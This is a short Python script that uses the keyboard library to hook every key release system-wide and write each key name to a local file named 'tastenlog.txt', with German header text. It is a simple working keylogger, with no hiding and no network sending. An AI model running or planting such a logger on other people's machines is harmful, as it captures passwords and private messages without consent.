import keyboard

def main():
    with open('tastenlog.txt', 'w') as f:
        f.write("Gedrückte Tasten:\n")
        
    keyboard.on_release(callback)

    try:
        keyboard.wait()
    except KeyboardInterrupt:
        pass
    finally:
        keyboard.unhook_all()

def callback(event):
    with open('tastenlog.txt', 'a') as f:
        f.write(event.name + '\n')

if __name__ == "__main__":
    main()
